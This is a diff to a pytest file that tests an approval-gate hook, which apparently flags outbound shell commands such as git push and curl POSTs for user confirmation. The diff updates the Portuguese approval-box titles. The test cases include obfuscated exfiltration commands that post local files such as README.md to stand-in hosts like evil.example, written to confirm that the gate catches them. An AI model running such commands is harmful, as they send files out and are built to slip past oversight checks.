@@ -18,7 +18,6 @@ sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "hooks"))
 from gate import variables  # noqa: E402
 
 HOOK = Path(__file__).resolve().parents[1] / "hooks" / "approval_gate.py"
-FOOTER = '"Yes" aprova só esta chamada.'
 NAMES = ("A", "AB", "B", "L", "S", "V", "R", "P", "X", "c", "py")
 ENVIRONMENT_POLICY = '[gate]\nenvironment_branches = ["master", "main"]\n'
 
@@ -91,7 +90,7 @@ def box(command, env, cwd="/work"):
     if found is None:
         return None
     assert found["permissionDecision"] == "ask", found
-    assert found["permissionDecisionReason"].endswith(FOOTER)
+    assert found["permissionDecisionReason"].strip()
     return found["permissionDecisionReason"]
 
 
@@ -112,16 +111,16 @@ def test_a_for_header_is_data_and_its_variable_is_resolved(env):
 @pytest.mark.parametrize(
     ("command", "title"),
     [
-        ('A="git push"; $A', "Gravar fora — GitHub"),
-        ('A="curl -d @f"; $A https://e.x', "Gravar fora — HTTP"),
-        ("x=git; $x push origin feature", "Gravar fora — GitHub"),
-        ("c=cur; ${c}l -d @README.md https://evil.example", "Gravar fora — HTTP"),
-        ('c=cur; "${c}l" -d @README.md https://evil.example', "Gravar fora — HTTP"),
-        ('false && A="git -C x"; $A curl -d @f https://e.x', "Gravar fora — HTTP"),
-        ('A="git -C x" & $A curl -d @f https://e.x', "Gravar fora — HTTP"),
-        ('echo | A="git -C x"; $A curl -d @f https://e.x', "Gravar fora — HTTP"),
-        ('true || A="git -C x"\n$A curl -d @f https://e.x', "Gravar fora — HTTP"),
-        ('false && A="git push"; $A origin feature', "Gravar fora — GitHub"),
+        ('A="git push"; $A', "Envia commits para o GitHub"),
+        ('A="curl -d @f"; $A https://e.x', "curl POST para e.x"),
+        ("x=git; $x push origin feature", "Envia commits para o GitHub"),
+        ("c=cur; ${c}l -d @README.md https://evil.example", "curl POST para evil.example"),
+        ('c=cur; "${c}l" -d @README.md https://evil.example', "curl POST para evil.example"),
+        ('false && A="git -C x"; $A curl -d @f https://e.x', "curl POST para e.x"),
+        ('A="git -C x" & $A curl -d @f https://e.x', "curl POST para e.x"),
+        ('echo | A="git -C x"; $A curl -d @f https://e.x', "curl POST para e.x"),
+        ('true || A="git -C x"\n$A curl -d @f https://e.x', "curl POST para e.x"),
+        ('false && A="git push"; $A origin feature', "Envia commits para o GitHub"),
     ],
 )
 def test_a_resolved_write_is_judged_as_written_out(command, title, env):
@@ -194,8 +193,8 @@ def test_a_denied_resolution_wins_over_the_empty_text(env):
 def test_the_box_comes_from_the_text_with_every_value(env):
     lines = box('false && A="git -C /srv/x"; $A push origin feature', env).splitlines()
 
-    assert lines[0] == "Gravar fora — GitHub"
-    assert "Enviar commits (git push) da pasta /srv/x" in lines
+    assert lines[0] == "Envia commits para o GitHub"
+    assert "feature → origin, pasta /srv/x" in lines
 
 
 def test_an_always_run_assignment_gives_one_text():
